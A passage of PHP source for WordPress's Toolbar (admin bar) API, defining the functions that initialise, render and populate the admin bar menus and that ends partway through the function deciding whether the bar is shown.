<?php
/**
 * Toolbar API: Top-level Toolbar functionality
 *
 * @package WordPress
 * @subpackage Toolbar
 * @since 3.1.0
 */

/**
 * Instantiate the admin bar object and set it up as a global for access elsewhere.
 *
 * UNHOOKING THIS FUNCTION WILL NOT PROPERLY REMOVE THE ADMIN BAR.
 * For that, use show_admin_bar(false) or the {@see 'show_admin_bar'} filter.
 *
 * @since 3.1.0
 * @access private
 *
 * @global WP_Admin_Bar $wp_admin_bar
 *
 * @return bool Whether the admin bar was successfully initialized.
 */
function _wp_admin_bar_init() {
	global $wp_admin_bar;

	if ( ! is_admin_bar_showing() ) {
		return false;
	}

	/* Load the admin bar class code ready for instantiation */
	require_once ABSPATH . WPINC . '/class-wp-admin-bar.php';

	/* Instantiate the admin bar */

	/**
	 * Filters the admin bar class to instantiate.
	 *
	 * @since 3.1.0
	 *
	 * @param string $wp_admin_bar_class Admin bar class to use. Default 'WP_Admin_Bar'.
	 */
	$admin_bar_class = apply_filters( 'wp_admin_bar_class', 'WP_Admin_Bar' );
	if ( class_exists( $admin_bar_class ) ) {
		$wp_admin_bar = new $admin_bar_class;
	} else {
		return false;
	}

	$wp_admin_bar->initialize();
	$wp_admin_bar->add_menus();

	return true;
}

/**
 * Renders the admin bar to the page based on the $wp_admin_bar->menu member var.
 *
 * This is called very early on the {@see 'wp_body_open'} action so that it will render
 * before anything else being added to the page body.
 *
 * For backward compatibility with themes not using the 'wp_body_open' action,
 * the function is also called late on {@see 'wp_footer'}.
 *
 * It includes the {@see 'admin_bar_menu'} action which should be used to hook in and
 * add new menus to the admin bar. That way you can be sure that you are adding at most
 * optimal point, right before the admin bar is rendered. This also gives you access to
 * the `$post` global, among others.
 *
 * @since 3.1.0
 * @since 5.4.0 Called on 'wp_body_open' action first, with 'wp_footer' as a fallback.
 *
 * @global WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_render() {
	global $wp_admin_bar;
	static $rendered = false;

	if ( $rendered ) {
		return;
	}

	if ( ! is_admin_bar_showing() || ! is_object( $wp_admin_bar ) ) {
		return;
	}

	/**
	 * Load all necessary admin bar items.
	 *
	 * This is the hook used to add, remove, or manipulate admin bar items.
	 *
	 * @since 3.1.0
	 *
	 * @param WP_Admin_Bar $wp_admin_bar WP_Admin_Bar instance, passed by reference
	 */
	do_action_ref_array( 'admin_bar_menu', array( &$wp_admin_bar ) );

	/**
	 * Fires before the admin bar is rendered.
	 *
	 * @since 3.1.0
	 */
	do_action( 'wp_before_admin_bar_render' );

	$wp_admin_bar->render();

	/**
	 * Fires after the admin bar is rendered.
	 *
	 * @since 3.1.0
	 */
	do_action( 'wp_after_admin_bar_render' );

	$rendered = true;
}

/**
 * Add the WordPress logo menu.
 *
 * @since 3.3.0
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_wp_menu( $wp_admin_bar ) {
	if ( current_user_can( 'read' ) ) {
		$about_url = self_admin_url( 'about.php' );
	} elseif ( is_multisite() ) {
		$about_url = get_dashboard_url( get_current_user_id(), 'about.php' );
	} else {
		$about_url = false;
	}

	$wp_logo_menu_args = array(
		'id'    => 'wp-logo',
		'title' => '<span class="ab-icon" aria-hidden="true"></span><span class="screen-reader-text">' . __( 'About WordPress' ) . '</span>',
		'href'  => $about_url,
	);

	// Set tabindex="0" to make sub menus accessible when no URL is available.
	if ( ! $about_url ) {
		$wp_logo_menu_args['meta'] = array(
			'tabindex' => 0,
		);
	}

	$wp_admin_bar->add_node( $wp_logo_menu_args );

	if ( $about_url ) {
		// Add "About WordPress" link.
		$wp_admin_bar->add_node(
			array(
				'parent' => 'wp-logo',
				'id'     => 'about',
				'title'  => __( 'About WordPress' ),
				'href'   => $about_url,
			)
		);
	}

	// Add WordPress.org link.
	$wp_admin_bar->add_node(
		array(
			'parent' => 'wp-logo-external',
			'id'     => 'wporg',
			'title'  => __( 'WordPress.org' ),
			'href'   => __( 'https://wordpress.org/' ),
		)
	);

	// Add documentation link.
	$wp_admin_bar->add_node(
		array(
			'parent' => 'wp-logo-external',
			'id'     => 'documentation',
			'title'  => __( 'Documentation' ),
			'href'   => __( 'https://wordpress.org/support/' ),
		)
	);

	// Add forums link.
	$wp_admin_bar->add_node(
		array(
			'parent' => 'wp-logo-external',
			'id'     => 'support-forums',
			'title'  => __( 'Support' ),
			'href'   => __( 'https://wordpress.org/support/forums/' ),
		)
	);

	// Add feedback link.
	$wp_admin_bar->add_node(
		array(
			'parent' => 'wp-logo-external',
			'id'     => 'feedback',
			'title'  => __( 'Feedback' ),
			'href'   => __( 'https://wordpress.org/support/forum/requests-and-feedback' ),
		)
	);
}

/**
 * Add the sidebar toggle button.
 *
 * @since 3.8.0
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_sidebar_toggle( $wp_admin_bar ) {
	if ( is_admin() ) {
		$wp_admin_bar->add_node(
			array(
				'id'    => 'menu-toggle',
				'title' => '<span class="ab-icon" aria-hidden="true"></span><span class="screen-reader-text">' . __( 'Menu' ) . '</span>',
				'href'  => '#',
			)
		);
	}
}

/**
 * Add the "My Account" item.
 *
 * @since 3.3.0
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_my_account_item( $wp_admin_bar ) {
	$user_id      = get_current_user_id();
	$current_user = wp_get_current_user();

	if ( ! $user_id ) {
		return;
	}

	if ( current_user_can( 'read' ) ) {
		$profile_url = get_edit_profile_url( $user_id );
	} elseif ( is_multisite() ) {
		$profile_url = get_dashboard_url( $user_id, 'profile.php' );
	} else {
		$profile_url = false;
	}

	$avatar = get_avatar( $user_id, 26 );
	/* translators: %s: Current user's display name. */
	$howdy = sprintf( __( 'Howdy, %s' ), '<span class="display-name">' . $current_user->display_name . '</span>' );
	$class = empty( $avatar ) ? '' : 'with-avatar';

	$wp_admin_bar->add_node(
		array(
			'id'     => 'my-account',
			'parent' => 'top-secondary',
			'title'  => $howdy . $avatar,
			'href'   => $profile_url,
			'meta'   => array(
				'class' => $class,
			),
		)
	);
}

/**
 * Add the "My Account" submenu items.
 *
 * @since 3.1.0
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_my_account_menu( $wp_admin_bar ) {
	$user_id      = get_current_user_id();
	$current_user = wp_get_current_user();

	if ( ! $user_id ) {
		return;
	}

	if ( current_user_can( 'read' ) ) {
		$profile_url = get_edit_profile_url( $user_id );
	} elseif ( is_multisite() ) {
		$profile_url = get_dashboard_url( $user_id, 'profile.php' );
	} else {
		$profile_url = false;
	}

	$wp_admin_bar->add_group(
		array(
			'parent' => 'my-account',
			'id'     => 'user-actions',
		)
	);

	$user_info  = get_avatar( $user_id, 64 );
	$user_info .= "<span class='display-name'>{$current_user->display_name}</span>";

	if ( $current_user->display_name !== $current_user->user_login ) {
		$user_info .= "<span class='username'>{$current_user->user_login}</span>";
	}

	$wp_admin_bar->add_node(
		array(
			'parent' => 'user-actions',
			'id'     => 'user-info',
			'title'  => $user_info,
			'href'   => $profile_url,
			'meta'   => array(
				'tabindex' => -1,
			),
		)
	);

	if ( false !== $profile_url ) {
		$wp_admin_bar->add_node(
			array(
				'parent' => 'user-actions',
				'id'     => 'edit-profile',
				'title'  => __( 'Edit Profile' ),
				'href'   => $profile_url,
			)
		);
	}

	$wp_admin_bar->add_node(
		array(
			'parent' => 'user-actions',
			'id'     => 'logout',
			'title'  => __( 'Log Out' ),
			'href'   => wp_logout_url(),
		)
	);
}

/**
 * Add the "Site Name" menu.
 *
 * @since 3.3.0
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_site_menu( $wp_admin_bar ) {
	// Don't show for logged out users.
	if ( ! is_user_logged_in() ) {
		return;
	}

	// Show only when the user is a member of this site, or they're a super admin.
	if ( ! is_user_member_of_blog() && ! current_user_can( 'manage_network' ) ) {
		return;
	}

	$blogname = get_bloginfo( 'name' );

	if ( ! $blogname ) {
		$blogname = preg_replace( '#^(https?://)?(www.)?#', '', get_home_url() );
	}

	if ( is_network_admin() ) {
		/* translators: %s: Site title. */
		$blogname = sprintf( __( 'Network Admin: %s' ), esc_html( get_network()->site_name ) );
	} elseif ( is_user_admin() ) {
		/* translators: %s: Site title. */
		$blogname = sprintf( __( 'User Dashboard: %s' ), esc_html( get_network()->site_name ) );
	}

	$title = wp_html_excerpt( $blogname, 40, '&hellip;' );

	$wp_admin_bar->add_node(
		array(
			'id'    => 'site-name',
			'title' => $title,
			'href'  => ( is_admin() || ! current_user_can( 'read' ) ) ? home_url( '/' ) : admin_url(),
		)
	);

	// Create submenu items.

	if ( is_admin() ) {
		// Add an option to visit the site.
		$wp_admin_bar->add_node(
			array(
				'parent' => 'site-name',
				'id'     => 'view-site',
				'title'  => __( 'Visit Site' ),
				'href'   => home_url( '/' ),
			)
		);

		if ( is_blog_admin() && is_multisite() && current_user_can( 'manage_sites' ) ) {
			$wp_admin_bar->add_node(
				array(
					'parent' => 'site-name',
					'id'     => 'edit-site',
					'title'  => __( 'Edit Site' ),
					'href'   => network_admin_url( 'site-info.php?id=' . get_current_blog_id() ),
				)
			);
		}
	} elseif ( current_user_can( 'read' ) ) {
		// We're on the front end, link to the Dashboard.
		$wp_admin_bar->add_node(
			array(
				'parent' => 'site-name',
				'id'     => 'dashboard',
				'title'  => __( 'Dashboard' ),
				'href'   => admin_url(),
			)
		);

		// Add the appearance submenu items.
		wp_admin_bar_appearance_menu( $wp_admin_bar );
	}
}

/**
 * Adds the "Customize" link to the Toolbar.
 *
 * @since 4.3.0
 *
 * @param WP_Admin_Bar $wp_admin_bar WP_Admin_Bar instance.
 * @global WP_Customize_Manager $wp_customize
 */
function wp_admin_bar_customize_menu( $wp_admin_bar ) {
	global $wp_customize;

	// Don't show for users who can't access the customizer or when in the admin.
	if ( ! current_user_can( 'customize' ) || is_admin() ) {
		return;
	}

	// Don't show if the user cannot edit a given customize_changeset post currently being previewed.
	if ( is_customize_preview() && $wp_customize->changeset_post_id()
		&& ! current_user_can( get_post_type_object( 'customize_changeset' )->cap->edit_post, $wp_customize->changeset_post_id() )
	) {
		return;
	}

	$current_url = ( is_ssl() ? 'https://' : 'http://' ) . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
	if ( is_customize_preview() && $wp_customize->changeset_uuid() ) {
		$current_url = remove_query_arg( 'customize_changeset_uuid', $current_url );
	}

	$customize_url = add_query_arg( 'url', urlencode( $current_url ), wp_customize_url() );
	if ( is_customize_preview() ) {
		$customize_url = add_query_arg( array( 'changeset_uuid' => $wp_customize->changeset_uuid() ), $customize_url );
	}

	$wp_admin_bar->add_node(
		array(
			'id'    => 'customize',
			'title' => __( 'Customize' ),
			'href'  => $customize_url,
			'meta'  => array(
				'class' => 'hide-if-no-customize',
			),
		)
	);
	add_action( 'wp_before_admin_bar_render', 'wp_customize_support_script' );
}

/**
 * Add the "My Sites/[Site Name]" menu and all submenus.
 *
 * @since 3.1.0
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_my_sites_menu( $wp_admin_bar ) {
	// Don't show for logged out users or single site mode.
	if ( ! is_user_logged_in() || ! is_multisite() ) {
		return;
	}

	// Show only when the user has at least one site, or they're a super admin.
	if ( count( $wp_admin_bar->user->blogs ) < 1 && ! current_user_can( 'manage_network' ) ) {
		return;
	}

	if ( $wp_admin_bar->user->active_blog ) {
		$my_sites_url = get_admin_url( $wp_admin_bar->user->active_blog->blog_id, 'my-sites.php' );
	} else {
		$my_sites_url = admin_url( 'my-sites.php' );
	}

	$wp_admin_bar->add_node(
		array(
			'id'    => 'my-sites',
			'title' => __( 'My Sites' ),
			'href'  => $my_sites_url,
		)
	);

	if ( current_user_can( 'manage_network' ) ) {
		$wp_admin_bar->add_group(
			array(
				'parent' => 'my-sites',
				'id'     => 'my-sites-super-admin',
			)
		);

		$wp_admin_bar->add_node(
			array(
				'parent' => 'my-sites-super-admin',
				'id'     => 'network-admin',
				'title'  => __( 'Network Admin' ),
				'href'   => network_admin_url(),
			)
		);

		$wp_admin_bar->add_node(
			array(
				'parent' => 'network-admin',
				'id'     => 'network-admin-d',
				'title'  => __( 'Dashboard' ),
				'href'   => network_admin_url(),
			)
		);

		if ( current_user_can( 'manage_sites' ) ) {
			$wp_admin_bar->add_node(
				array(
					'parent' => 'network-admin',
					'id'     => 'network-admin-s',
					'title'  => __( 'Sites' ),
					'href'   => network_admin_url( 'sites.php' ),
				)
			);
		}

		if ( current_user_can( 'manage_network_users' ) ) {
			$wp_admin_bar->add_node(
				array(
					'parent' => 'network-admin',
					'id'     => 'network-admin-u',
					'title'  => __( 'Users' ),
					'href'   => network_admin_url( 'users.php' ),
				)
			);
		}

		if ( current_user_can( 'manage_network_themes' ) ) {
			$wp_admin_bar->add_node(
				array(
					'parent' => 'network-admin',
					'id'     => 'network-admin-t',
					'title'  => __( 'Themes' ),
					'href'   => network_admin_url( 'themes.php' ),
				)
			);
		}

		if ( current_user_can( 'manage_network_plugins' ) ) {
			$wp_admin_bar->add_node(
				array(
					'parent' => 'network-admin',
					'id'     => 'network-admin-p',
					'title'  => __( 'Plugins' ),
					'href'   => network_admin_url( 'plugins.php' ),
				)
			);
		}

		if ( current_user_can( 'manage_network_options' ) ) {
			$wp_admin_bar->add_node(
				array(
					'parent' => 'network-admin',
					'id'     => 'network-admin-o',
					'title'  => __( 'Settings' ),
					'href'   => network_admin_url( 'settings.php' ),
				)
			);
		}
	}

	// Add site links.
	$wp_admin_bar->add_group(
		array(
			'parent' => 'my-sites',
			'id'     => 'my-sites-list',
			'meta'   => array(
				'class' => current_user_can( 'manage_network' ) ? 'ab-sub-secondary' : '',
			),
		)
	);

	foreach ( (array) $wp_admin_bar->user->blogs as $blog ) {
		switch_to_blog( $blog->userblog_id );

		if ( has_site_icon() ) {
			$blavatar = sprintf(
				'<img class="blavatar" src="%s" srcset="%s 2x" alt="" width="16" height="16" />',
				esc_url( get_site_icon_url( 16 ) ),
				esc_url( get_site_icon_url( 32 ) )
			);
		} else {
			$blavatar = '<div class="blavatar"></div>';
		}

		$blogname = $blog->blogname;

		if ( ! $blogname ) {
			$blogname = preg_replace( '#^(https?://)?(www.)?#', '', get_home_url() );
		}

		$menu_id = 'blog-' . $blog->userblog_id;

		if ( current_user_can( 'read' ) ) {
			$wp_admin_bar->add_node(
				array(
					'parent' => 'my-sites-list',
					'id'     => $menu_id,
					'title'  => $blavatar . $blogname,
					'href'   => admin_url(),
				)
			);

			$wp_admin_bar->add_node(
				array(
					'parent' => $menu_id,
					'id'     => $menu_id . '-d',
					'title'  => __( 'Dashboard' ),
					'href'   => admin_url(),
				)
			);
		} else {
			$wp_admin_bar->add_node(
				array(
					'parent' => 'my-sites-list',
					'id'     => $menu_id,
					'title'  => $blavatar . $blogname,
					'href'   => home_url(),
				)
			);
		}

		if ( current_user_can( get_post_type_object( 'post' )->cap->create_posts ) ) {
			$wp_admin_bar->add_node(
				array(
					'parent' => $menu_id,
					'id'     => $menu_id . '-n',
					'title'  => get_post_type_object( 'post' )->labels->new_item,
					'href'   => admin_url( 'post-new.php' ),
				)
			);
		}

		if ( current_user_can( 'edit_posts' ) ) {
			$wp_admin_bar->add_node(
				array(
					'parent' => $menu_id,
					'id'     => $menu_id . '-c',
					'title'  => __( 'Manage Comments' ),
					'href'   => admin_url( 'edit-comments.php' ),
				)
			);
		}

		$wp_admin_bar->add_node(
			array(
				'parent' => $menu_id,
				'id'     => $menu_id . '-v',
				'title'  => __( 'Visit Site' ),
				'href'   => home_url( '/' ),
			)
		);

		restore_current_blog();
	}
}

/**
 * Provide a shortlink.
 *
 * @since 3.1.0
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_shortlink_menu( $wp_admin_bar ) {
	$short = wp_get_shortlink( 0, 'query' );
	$id    = 'get-shortlink';

	if ( empty( $short ) ) {
		return;
	}

	$html = '<input class="shortlink-input" type="text" readonly="readonly" value="' . esc_attr( $short ) . '" />';

	$wp_admin_bar->add_node(
		array(
			'id'    => $id,
			'title' => __( 'Shortlink' ),
			'href'  => $short,
			'meta'  => array( 'html' => $html ),
		)
	);
}

/**
 * Provide an edit link for posts and terms.
 *
 * @since 3.1.0
 * @since 5.5.0 Added a "View Post" link on Comments screen for a single post.
 *
 * @global WP_Term  $tag
 * @global WP_Query $wp_the_query WordPress Query object.
 * @global int      $user_id      The ID of the user being edited. Not to be confused with the
 *                                global $user_ID, which contains the ID of the current user.
 * @global int      $post_id      The ID of the post when editing comments for a single post.
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_edit_menu( $wp_admin_bar ) {
	global $tag, $wp_the_query, $user_id, $post_id;

	if ( is_admin() ) {
		$current_screen   = get_current_screen();
		$post             = get_post();
		$post_type_object = null;

		if ( 'post' === $current_screen->base ) {
			$post_type_object = get_post_type_object( $post->post_type );
		} elseif ( 'edit' === $current_screen->base ) {
			$post_type_object = get_post_type_object( $current_screen->post_type );
		} elseif ( 'edit-comments' === $current_screen->base && $post_id ) {
			$post = get_post( $post_id );
			if ( $post ) {
				$post_type_object = get_post_type_object( $post->post_type );
			}
		}

		if ( ( 'post' === $current_screen->base || 'edit-comments' === $current_screen->base )
			&& 'add' !== $current_screen->action
			&& ( $post_type_object )
			&& current_user_can( 'read_post', $post->ID )
			&& ( $post_type_object->public )
			&& ( $post_type_object->show_in_admin_bar ) ) {
			if ( 'draft' === $post->post_status ) {
				$preview_link = get_preview_post_link( $post );
				$wp_admin_bar->add_node(
					array(
						'id'    => 'preview',
						'title' => $post_type_object->labels->view_item,
						'href'  => esc_url( $preview_link ),
						'meta'  => array( 'target' => 'wp-preview-' . $post->ID ),
					)
				);
			} else {
				$wp_admin_bar->add_node(
					array(
						'id'    => 'view',
						'title' => $post_type_object->labels->view_item,
						'href'  => get_permalink( $post->ID ),
					)
				);
			}
		} elseif ( 'edit' === $current_screen->base
			&& ( $post_type_object )
			&& ( $post_type_object->public )
			&& ( $post_type_object->show_in_admin_bar )
			&& ( get_post_type_archive_link( $post_type_object->name ) )
			&& ! ( 'post' === $post_type_object->name && 'posts' === get_option( 'show_on_front' ) ) ) {
			$wp_admin_bar->add_node(
				array(
					'id'    => 'archive',
					'title' => $post_type_object->labels->view_items,
					'href'  => get_post_type_archive_link( $current_screen->post_type ),
				)
			);
		} elseif ( 'term' === $current_screen->base && isset( $tag ) && is_object( $tag ) && ! is_wp_error( $tag ) ) {
			$tax = get_taxonomy( $tag->taxonomy );
			if ( is_taxonomy_viewable( $tax ) ) {
				$wp_admin_bar->add_node(
					array(
						'id'    => 'view',
						'title' => $tax->labels->view_item,
						'href'  => get_term_link( $tag ),
					)
				);
			}
		} elseif ( 'user-edit' === $current_screen->base && isset( $user_id ) ) {
			$user_object = get_userdata( $user_id );
			$view_link   = get_author_posts_url( $user_object->ID );
			if ( $user_object->exists() && $view_link ) {
				$wp_admin_bar->add_node(
					array(
						'id'    => 'view',
						'title' => __( 'View User' ),
						'href'  => $view_link,
					)
				);
			}
		}
	} else {
		$current_object = $wp_the_query->get_queried_object();

		if ( empty( $current_object ) ) {
			return;
		}

		if ( ! empty( $current_object->post_type ) ) {
			$post_type_object = get_post_type_object( $current_object->post_type );
			$edit_post_link   = get_edit_post_link( $current_object->ID );
			if ( $post_type_object
				&& $edit_post_link
				&& current_user_can( 'edit_post', $current_object->ID )
				&& $post_type_object->show_in_admin_bar ) {
				$wp_admin_bar->add_node(
					array(
						'id'    => 'edit',
						'title' => $post_type_object->labels->edit_item,
						'href'  => $edit_post_link,
					)
				);
			}
		} elseif ( ! empty( $current_object->taxonomy ) ) {
			$tax            = get_taxonomy( $current_object->taxonomy );
			$edit_term_link = get_edit_term_link( $current_object->term_id, $current_object->taxonomy );
			if ( $tax && $edit_term_link && current_user_can( 'edit_term', $current_object->term_id ) ) {
				$wp_admin_bar->add_node(
					array(
						'id'    => 'edit',
						'title' => $tax->labels->edit_item,
						'href'  => $edit_term_link,
					)
				);
			}
		} elseif ( is_a( $current_object, 'WP_User' ) && current_user_can( 'edit_user', $current_object->ID ) ) {
			$edit_user_link = get_edit_user_link( $current_object->ID );
			if ( $edit_user_link ) {
				$wp_admin_bar->add_node(
					array(
						'id'    => 'edit',
						'title' => __( 'Edit User' ),
						'href'  => $edit_user_link,
					)
				);
			}
		}
	}
}

/**
 * Add "Add New" menu.
 *
 * @since 3.1.0
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_new_content_menu( $wp_admin_bar ) {
	$actions = array();

	$cpts = (array) get_post_types( array( 'show_in_admin_bar' => true ), 'objects' );

	if ( isset( $cpts['post'] ) && current_user_can( $cpts['post']->cap->create_posts ) ) {
		$actions['post-new.php'] = array( $cpts['post']->labels->name_admin_bar, 'new-post' );
	}

	if ( isset( $cpts['attachment'] ) && current_user_can( 'upload_files' ) ) {
		$actions['media-new.php'] = array( $cpts['attachment']->labels->name_admin_bar, 'new-media' );
	}

	if ( current_user_can( 'manage_links' ) ) {
		$actions['link-add.php'] = array( _x( 'Link', 'add new from admin bar' ), 'new-link' );
	}

	if ( isset( $cpts['page'] ) && current_user_can( $cpts['page']->cap->create_posts ) ) {
		$actions['post-new.php?post_type=page'] = array( $cpts['page']->labels->name_admin_bar, 'new-page' );
	}

	unset( $cpts['post'], $cpts['page'], $cpts['attachment'] );

	// Add any additional custom post types.
	foreach ( $cpts as $cpt ) {
		if ( ! current_user_can( $cpt->cap->create_posts ) ) {
			continue;
		}

		$key             = 'post-new.php?post_type=' . $cpt->name;
		$actions[ $key ] = array( $cpt->labels->name_admin_bar, 'new-' . $cpt->name );
	}
	// Avoid clash with parent node and a 'content' post type.
	if ( isset( $actions['post-new.php?post_type=content'] ) ) {
		$actions['post-new.php?post_type=content'][1] = 'add-new-content';
	}

	if ( current_user_can( 'create_users' ) || ( is_multisite() && current_user_can( 'promote_users' ) ) ) {
		$actions['user-new.php'] = array( _x( 'User', 'add new from admin bar' ), 'new-user' );
	}

	if ( ! $actions ) {
		return;
	}

	$title = '<span class="ab-icon" aria-hidden="true"></span><span class="ab-label">' . _x( 'New', 'admin bar menu group label' ) . '</span>';

	$wp_admin_bar->add_node(
		array(
			'id'    => 'new-content',
			'title' => $title,
			'href'  => admin_url( current( array_keys( $actions ) ) ),
		)
	);

	foreach ( $actions as $link => $action ) {
		list( $title, $id ) = $action;

		$wp_admin_bar->add_node(
			array(
				'parent' => 'new-content',
				'id'     => $id,
				'title'  => $title,
				'href'   => admin_url( $link ),
			)
		);
	}
}

/**
 * Add edit comments link with awaiting moderation count bubble.
 *
 * @since 3.1.0
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_comments_menu( $wp_admin_bar ) {
	if ( ! current_user_can( 'edit_posts' ) ) {
		return;
	}

	$awaiting_mod  = wp_count_comments();
	$awaiting_mod  = $awaiting_mod->moderated;
	$awaiting_text = sprintf(
		/* translators: %s: Number of comments. */
		_n( '%s Comment in moderation', '%s Comments in moderation', $awaiting_mod ),
		number_format_i18n( $awaiting_mod )
	);

	$icon   = '<span class="ab-icon" aria-hidden="true"></span>';
	$title  = '<span class="ab-label awaiting-mod pending-count count-' . $awaiting_mod . '" aria-hidden="true">' . number_format_i18n( $awaiting_mod ) . '</span>';
	$title .= '<span class="screen-reader-text comments-in-moderation-text">' . $awaiting_text . '</span>';

	$wp_admin_bar->add_node(
		array(
			'id'    => 'comments',
			'title' => $icon . $title,
			'href'  => admin_url( 'edit-comments.php' ),
		)
	);
}

/**
 * Add appearance submenu items to the "Site Name" menu.
 *
 * @since 3.1.0
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_appearance_menu( $wp_admin_bar ) {
	$wp_admin_bar->add_group(
		array(
			'parent' => 'site-name',
			'id'     => 'appearance',
		)
	);

	if ( current_user_can( 'switch_themes' ) ) {
		$wp_admin_bar->add_node(
			array(
				'parent' => 'appearance',
				'id'     => 'themes',
				'title'  => __( 'Themes' ),
				'href'   => admin_url( 'themes.php' ),
			)
		);
	}

	if ( ! current_user_can( 'edit_theme_options' ) ) {
		return;
	}

	if ( current_theme_supports( 'widgets' ) ) {
		$wp_admin_bar->add_node(
			array(
				'parent' => 'appearance',
				'id'     => 'widgets',
				'title'  => __( 'Widgets' ),
				'href'   => admin_url( 'widgets.php' ),
			)
		);
	}

	if ( current_theme_supports( 'menus' ) || current_theme_supports( 'widgets' ) ) {
		$wp_admin_bar->add_node(
			array(
				'parent' => 'appearance',
				'id'     => 'menus',
				'title'  => __( 'Menus' ),
				'href'   => admin_url( 'nav-menus.php' ),
			)
		);
	}

	if ( current_theme_supports( 'custom-background' ) ) {
		$wp_admin_bar->add_node(
			array(
				'parent' => 'appearance',
				'id'     => 'background',
				'title'  => __( 'Background' ),
				'href'   => admin_url( 'themes.php?page=custom-background' ),
				'meta'   => array(
					'class' => 'hide-if-customize',
				),
			)
		);
	}

	if ( current_theme_supports( 'custom-header' ) ) {
		$wp_admin_bar->add_node(
			array(
				'parent' => 'appearance',
				'id'     => 'header',
				'title'  => __( 'Header' ),
				'href'   => admin_url( 'themes.php?page=custom-header' ),
				'meta'   => array(
					'class' => 'hide-if-customize',
				),
			)
		);
	}

}

/**
 * Provide an update link if theme/plugin/core updates are available.
 *
 * @since 3.1.0
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_updates_menu( $wp_admin_bar ) {

	$update_data = wp_get_update_data();

	if ( ! $update_data['counts']['total'] ) {
		return;
	}

	$updates_text = sprintf(
		/* translators: %s: Total number of updates available. */
		_n( '%s update available', '%s updates available', $update_data['counts']['total'] ),
		number_format_i18n( $update_data['counts']['total'] )
	);

	$icon   = '<span class="ab-icon" aria-hidden="true"></span>';
	$title  = '<span class="ab-label" aria-hidden="true">' . number_format_i18n( $update_data['counts']['total'] ) . '</span>';
	$title .= '<span class="screen-reader-text updates-available-text">' . $updates_text . '</span>';

	$wp_admin_bar->add_node(
		array(
			'id'    => 'updates',
			'title' => $icon . $title,
			'href'  => network_admin_url( 'update-core.php' ),
		)
	);
}

/**
 * Add search form.
 *
 * @since 3.3.0
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_search_menu( $wp_admin_bar ) {
	if ( is_admin() ) {
		return;
	}

	$form  = '<form action="' . esc_url( home_url( '/' ) ) . '" method="get" id="adminbarsearch">';
	$form .= '<input class="adminbar-input" name="s" id="adminbar-search" type="text" value="" maxlength="150" />';
	$form .= '<label for="adminbar-search" class="screen-reader-text">' . __( 'Search' ) . '</label>';
	$form .= '<input type="submit" class="adminbar-button" value="' . __( 'Search' ) . '" />';
	$form .= '</form>';

	$wp_admin_bar->add_node(
		array(
			'parent' => 'top-secondary',
			'id'     => 'search',
			'title'  => $form,
			'meta'   => array(
				'class'    => 'admin-bar-search',
				'tabindex' => -1,
			),
		)
	);
}

/**
 * Add a link to exit recovery mode when Recovery Mode is active.
 *
 * @since 5.2.0
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_recovery_mode_menu( $wp_admin_bar ) {
	if ( ! wp_is_recovery_mode() ) {
		return;
	}

	$url = wp_login_url();
	$url = add_query_arg( 'action', WP_Recovery_Mode::EXIT_ACTION, $url );
	$url = wp_nonce_url( $url, WP_Recovery_Mode::EXIT_ACTION );

	$wp_admin_bar->add_node(
		array(
			'parent' => 'top-secondary',
			'id'     => 'recovery-mode',
			'title'  => __( 'Exit Recovery Mode' ),
			'href'   => $url,
		)
	);
}

/**
 * Add secondary menus.
 *
 * @since 3.3.0
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function wp_admin_bar_add_secondary_groups( $wp_admin_bar ) {
	$wp_admin_bar->add_group(
		array(
			'id'   => 'top-secondary',
			'meta' => array(
				'class' => 'ab-top-secondary',
			),
		)
	);

	$wp_admin_bar->add_group(
		array(
			'parent' => 'wp-logo',
			'id'     => 'wp-logo-external',
			'meta'   => array(
				'class' => 'ab-sub-secondary',
			),
		)
	);
}

/**
 * Style and scripts for the admin bar.
 *
 * @since 3.1.0
 */
function wp_admin_bar_header() {
	$type_attr = current_theme_supports( 'html5', 'style' ) ? '' : ' type="text/css"';
	?>
<style<?php echo $type_attr; ?> media="print">#wpadminbar { display:none; }</style>
	<?php
}

/**
 * Default admin bar callback.
 *
 * @since 3.1.0
 */
function _admin_bar_bump_cb() {
	$type_attr = current_theme_supports( 'html5', 'style' ) ? '' : ' type="text/css"';
	?>
<style<?php echo $type_attr; ?> media="screen">
	html { margin-top: 32px !important; }
	* html body { margin-top: 32px !important; }
	@media screen and ( max-width: 782px ) {
		html { margin-top: 46px !important; }
		* html body { margin-top: 46px !important; }
	}
</style>
	<?php
}

/**
 * Sets the display status of the admin bar.
 *
 * This can be called immediately upon plugin load. It does not need to be called
 * from a function hooked to the {@see 'init'} action.
 *
 * @since 3.1.0
 *
 * @global bool $show_admin_bar
 *
 * @param bool $show Whether to allow the admin bar to show.
 */
function show_admin_bar( $show ) {
	global $show_admin_bar;
	$show_admin_bar = (bool) $show;
}

/**
 * Determines whether the admin bar should be showing.
 *
 * For more information on this and similar theme functions, check out
 * the {@link https://developer.wordpress.org/themes/basics/conditional-tags/
 * Conditional Tags} article in the Theme Developer Handbook.
 *
 * @since 3.1.0
 *
 * @global bool   $show_admin_bar
 * @global string $pagenow
 *
 * @return bool Whether the admin bar should be showing.
 */
function is_admin_bar_showing() {
	global $show_admin_bar, $pagenow;

	// For all these types of requests, we never want an admin bar.
	if ( defined( 'XMLRPC_REQUEST' ) || defined( 'DOING_AJAX' ) || defined( 'IFRAME_REQUEST' ) || wp_is_json_request() ) {
		return false;
	}

	if ( is_embed() ) {
		return false;
	}

	// Integrated into the admin.
	if ( is_admin() ) {
		return true;
	}

